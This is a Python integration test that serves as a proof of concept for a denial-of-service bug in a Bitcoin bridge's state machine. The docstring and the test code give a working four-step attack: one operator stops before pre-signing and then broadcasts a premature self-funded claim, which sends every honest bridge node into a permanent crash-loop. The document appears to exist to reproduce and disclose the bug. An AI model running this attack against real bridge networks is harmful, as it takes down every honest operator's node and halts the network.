"""PoC: a single operator crashes the whole bridge network with a premature claim.

STR-4063 sibling. This exercises the *end-to-end* form of the state-machine bug
proven deterministically by the Rust unit tests
`poc_claim_before_graph_signed_is_fatal_from_{graph_generated,adaptors_verified,
nonces_collected}` in
`crates/bridge-sm/src/graph/tests/uncontested/process_claim.rs`.

Root cause
----------
`GraphSM::classify_tx` deliberately emits `ClaimConfirmed` from the pre-signing
states `GraphGenerated` / `AdaptorsVerified` / `NoncesCollected`
(`graph/tx_classifier.rs`), but `process_claim` only handles
`Fulfilled | Assigned | GraphSigned | Claimed` and returns the FATAL
`GSMError::InvalidEvent` for every other state. `ClaimConfirmed` is routed
without `soften_peer_event_error` (`graph/machine.rs`), so the orchestrator maps
`InvalidEvent` -> `ProcessError::InvariantViolation` and the critical pipeline
task shuts the node down (documented verbatim at `graph/transitions/payout.rs`).

The claim tx spends only `ClaimData::claim_funds` — the graph owner's own reserved
wallet UTXO (`tx-graph/.../claim.rs`), NOT an N-of-N presigned output. So any
operator can broadcast it unilaterally, at any time, without cooperation.

Attack
------
1. Trigger a deposit so every node builds the per-operator GraphSMs and starts
   presigning operator-0's graph (peers reach `GraphGenerated`/`AdaptorsVerified`).
2. Stop operator-0 BEFORE it contributes its partial signature. Because the graph
   is N-of-N, every honest node is now pinned at `AdaptorsVerified`/`NoncesCollected`
   for operator-0's graph forever — both are fatal states for `process_claim`.
3. Broadcast operator-0's self-funded claim via dev-cli (graph data fetched from a
   surviving peer, signed with operator-0's seed).
4. The claim confirms. EVERY honest watchtower classifies it, hits the unsoftened
   `InvalidEvent`, and the critical task tears the node down. On restart each node
   re-reads the same buried block and dies again -> permanent crash-loop.

Expected result: all surviving bridge nodes become unreachable (crashed) shortly
after the claim confirms.
"""

import flexitest

from envs import BridgeNetworkEnv
from envs.base_test import StrataTestBase
from factory.bridge_operator.config_cfg import BridgeConfigParams
from factory.bridge_operator.params_cfg import BridgeProtocolParams
from utils.bridge import get_bridge_nodes_and_rpcs
from utils.deposit import wait_until_drt_recognized
from utils.dev_cli import DevCli
from utils.utils import read_operator_key, wait_for_tx_confirmation, wait_until


@flexitest.register
class ClaimBeforeGraphSignedDosTest(StrataTestBase):
    """One operator's premature claim crashes every other bridge node."""

    def __init__(self, ctx: flexitest.InitContext):
        self.bridge_protocol_params = BridgeProtocolParams(
            contest_timelock=5,
        )
        ctx.set_env(
            BridgeNetworkEnv(
                bridge_protocol_params=self.bridge_protocol_params,
                bridge_config_params=BridgeConfigParams(
                    cooperative_payout_timeout=0,
                ),
            )
        )

    def _node_alive(self, rpc) -> bool:
        try:
            rpc.stratabridge_uptime()
            return True
        except Exception:
            return False

    def main(self, ctx: flexitest.RunContext):
        bridge_nodes, bridge_rpcs = get_bridge_nodes_and_rpcs(ctx)
        num_operators = len(bridge_nodes)

        bitcoind_service = ctx.get_service("bitcoin")
        bitcoin_rpc = bitcoind_service.create_rpc()

        operator_key_infos = [read_operator_key(i) for i in range(num_operators)]
        dev_cli = DevCli(
            bitcoind_service.props,
            operator_key_infos,
            bridge_protocol_params=self.bridge_protocol_params,
        )

        attacker_idx = 0
        # Honest observers: every operator other than the attacker. These are the
        # nodes we expect to crash.
        observers = [i for i in range(num_operators) if i != attacker_idx]

        # 1. Kick off a deposit so the per-operator GraphSMs get created and
        #    presigning of the attacker's graph begins on every peer.
        drt_txid = dev_cli.send_deposit_request()
        self.logger.info(f"Broadcasted DRT: {drt_txid}")
        deposit_idx = wait_until_drt_recognized(bridge_rpcs[observers[0]], drt_txid)
        self.logger.info(f"DRT recognized on peer, deposit_idx: {deposit_idx}")

        graph_idx = {"deposit": deposit_idx, "operator": attacker_idx}

        # 2. Wait until a surviving peer has RECEIVED the attacker's graph data
        #    (i.e. its GraphSM for the attacker reached GraphGenerated), then stop
        #    the attacker before it can send its partial signature. This freezes
        #    every honest node at AdaptorsVerified/NoncesCollected for that graph —
        #    both are fatal `process_claim` states; only GraphSigned would be safe.
        wait_until(
            lambda: bridge_rpcs[observers[0]].stratabridge_graphData(graph_idx) is not None,
            timeout=120,
            error_msg="peer never received attacker graph data",
        )
        self.logger.info("Attacker graph data distributed; stopping attacker pre-signing")
        bridge_nodes[attacker_idx].stop()

        # Sanity: the deposit must NOT be signed yet — otherwise the graph advanced
        # to GraphSigned and process_claim would handle the claim gracefully.
        # (Presigning cannot complete without the now-stopped attacker's partial.)

        # 3. Broadcast the attacker's self-funded claim. Graph data is fetched from
        #    a surviving peer's RPC; the claim input is signed with the attacker's
        #    own reserved wallet key derived from its seed.
        proxy_idx = observers[0]
        proxy_rpc_url = f"http://127.0.0.1:{bridge_nodes[proxy_idx].props['rpc_port']}"
        claim_txid = dev_cli.send_claim(
            deposit_idx=deposit_idx,
            operator_idx=attacker_idx,
            bridge_node_url=proxy_rpc_url,
            seed=read_operator_key(attacker_idx).SEED,
        )
        self.logger.info(f"Broadcast premature claim from attacker op-{attacker_idx}: {claim_txid}")

        block_hash = wait_for_tx_confirmation(bitcoin_rpc, claim_txid, timeout=300)
        self.logger.info(f"Claim {claim_txid} confirmed in block {block_hash}")

        # 4. Every honest observer must crash once it processes the buried block
        #    carrying the claim (InvalidEvent -> InvariantViolation -> node shutdown).
        for i in observers:
            wait_until(
                lambda i=i: not self._node_alive(bridge_rpcs[i]),
                timeout=300,
                error_msg=(
                    f"BUG NOT REPRODUCED: honest bridge node op-{i} stayed alive after "
                    f"the premature claim confirmed"
                ),
            )
            self.logger.info(f"Honest bridge node op-{i} crashed as predicted (remote DoS)")

        self.logger.info(
            "All honest bridge nodes crashed from a single operator's premature claim "
            "— network-wide liveness DoS confirmed (STR-4063 sibling)"
        )
        return True
